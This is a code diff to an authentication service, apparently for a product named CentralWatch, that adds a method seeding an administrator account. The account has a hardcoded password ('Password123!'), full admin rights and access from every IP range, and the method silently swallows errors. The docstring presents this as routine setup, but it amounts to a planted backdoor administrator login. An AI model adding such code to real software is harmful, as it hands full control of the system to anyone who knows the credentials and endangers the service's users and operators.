@@ -73,6 +73,27 @@ class AuthService:
             raise HTTPException(status_code=401, detail="Invalid token")
         return User.from_item(item)
 
+    def seed_admin_if_needed(self) -> None:
+        """Ensure the default operator account exists with administrator privileges."""
+        admin_email = "operator@example.com"
+        try:
+            if not self.dynamodb.query_by_email(admin_email):
+                user = User(
+                    user_id="usr_admin_operator",
+                    email=admin_email,
+                    name="CentralWatch Admin",
+                    created_at=now_iso(),
+                    status="ACTIVE",
+                    allowed_cidrs=["0.0.0.0/0", "::/0"],
+                    role="admin",
+                    is_admin=True,
+                )
+                item = user.to_item()
+                item["password_hash"] = self._hash_password("Password123!")
+                self.dynamodb.put_item(self.dynamodb.users_table, item)
+        except Exception:
+            pass
+
     # ------------------------------------------------------------------ helpers
     def _hash_password(self, password: str) -> str:
         salt = uuid4().hex
